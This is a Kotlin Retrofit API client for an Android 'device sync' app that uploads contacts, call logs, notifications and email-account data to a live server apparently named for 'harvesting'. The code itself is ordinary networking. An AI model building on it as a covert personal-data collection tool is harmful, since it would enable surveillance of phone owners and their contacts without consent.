package com.devicesync.app.data.api

import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.*
import com.devicesync.app.data.models.*
import java.util.*
import okhttp3.OkHttpClient

interface ApiInterface {
    
    @POST("devices/register")
    suspend fun registerDevice(@Body request: DeviceRegistrationRequest): Response<DeviceRegistrationResponse>
    
    @GET("devices/{deviceId}/settings")
    suspend fun getDeviceSettings(@Path("deviceId") deviceId: String): Response<DeviceSettingsResponse>
    
    @POST("devices/{deviceId}/sync/{dataType}")
    suspend fun updateSyncTimestamp(
        @Path("deviceId") deviceId: String,
        @Path("dataType") dataType: String,
        @Body request: SyncTimestampRequest
    ): Response<ApiResponse>
    
    @POST("devices/{deviceId}/sync")
    suspend fun syncData(
        @Path("deviceId") deviceId: String,
        @Body request: DataSyncRequest
    ): Response<SyncResponse>
    
    @GET("health")
    suspend fun testConnection(): Response<HealthResponse>
}

class ApiService {
    
    private val api: ApiInterface
    
    companion object {
        private const val BASE_URL = "https://kotlin-node-harvesting.onrender.com/api/" // Live server
        // private const val BASE_URL = "http://10.151.145.254:5001/api/" // Physical device - No Auth
        // private const val BASE_URL = "http://10.0.2.2:5001/api/" // Android emulator
    }
    
    init {
        // Create OkHttpClient with better timeout configuration
        val okHttpClient = OkHttpClient.Builder()
            .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
            .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
            .addInterceptor { chain ->
                val request = chain.request()
                println("🌐 Making API request to: ${request.url}")
                val response = chain.proceed(request)
                println("🌐 API response: ${response.code}")
                response
            }
            .build()
            
        val retrofit = Retrofit.Builder()
            .baseUrl(BASE_URL)
            .client(okHttpClient)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
            
        api = retrofit.create(ApiInterface::class.java)
    }
    
    suspend fun registerDevice(deviceInfo: DeviceInfo): Response<DeviceRegistrationResponse> {
        val request = DeviceRegistrationRequest(
            deviceId = deviceInfo.deviceId,
            androidId = deviceInfo.androidId,
            deviceInfo = mapOf(
                "platform" to deviceInfo.platform,
                "details" to deviceInfo.details
            )
        )
        return api.registerDevice(request)
    }
    
    suspend fun getDeviceSettings(deviceId: String): Response<DeviceSettingsResponse> {
        return api.getDeviceSettings(deviceId)
    }
    
    suspend fun updateSyncTimestamp(deviceId: String, dataType: String, timestamp: Date): Response<ApiResponse> {
        val request = SyncTimestampRequest(timestamp.time)
        return api.updateSyncTimestamp(deviceId, dataType, request)
    }
    
    suspend fun syncData(deviceId: String, dataType: String, data: List<Map<String, Any>>): Response<SyncResponse> {
        val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
            .format(java.util.Date())
        val request = DataSyncRequest(dataType, data, timestamp)
        return api.syncData(deviceId, request)
    }
    
    suspend fun testConnection(): Response<HealthResponse> {
        return api.testConnection()
    }
}

// Request/Response data classes
data class DeviceRegistrationRequest(
    val deviceId: String,
    val androidId: String,
    val deviceInfo: Map<String, String>
)

data class DeviceRegistrationResponse(
    val message: String,
    val isNewDevice: Boolean,
    val device: Map<String, Any>
)

data class DeviceSettingsResponse(
    val settings: Map<String, Any>,
    val lastSync: Map<String, String?>,
    val stats: Map<String, Int>
)

data class SyncTimestampRequest(
    val timestamp: Long
)

data class ContactsSyncRequest(
    val deviceId: String,
    val contacts: List<ContactModel>
)

data class CallLogsSyncRequest(
    val deviceId: String,
    val callLogs: List<CallLogModel>
)

data class NotificationsSyncRequest(
    val deviceId: String,
    val notifications: List<NotificationModel>
)

data class EmailAccountsSyncRequest(
    val deviceId: String,
    val emailAccounts: List<EmailAccountModel>
)

data class SyncResponse(
    val success: Boolean,
    val data: SyncData,
    val message: String
)

data class SyncData(
    val success: Boolean,
    val itemsSynced: Int,
    val message: String
)

data class ApiResponse(
    val message: String
)

data class HealthResponse(
    val status: String,
    val timestamp: String
)
